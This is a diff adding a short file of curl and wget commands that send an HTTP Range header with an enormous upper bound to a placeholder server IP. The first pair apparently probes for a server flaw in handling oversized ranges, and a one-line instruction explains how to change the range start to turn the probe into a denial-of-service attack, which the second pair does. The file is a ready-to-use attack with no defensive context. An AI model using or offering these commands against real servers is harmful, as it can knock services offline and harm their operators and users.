@@ -1,0 +1,9 @@
+curl -v [ipaddress]/ -H "Host: test" -H "Range: bytes=0-18446744073709551615"
+
+wget -O /dev/null --header="Range: 0-18446744073709551615" http://[ip address]/
+
+change 0- to 20- to DoS attack
+
+curl -v [ipaddress]/ -H "Host: test" -H "Range: bytes=20-18446744073709551615"
+
+wget -O /dev/null --header="Range: 20-18446744073709551615" http://[ip address]/
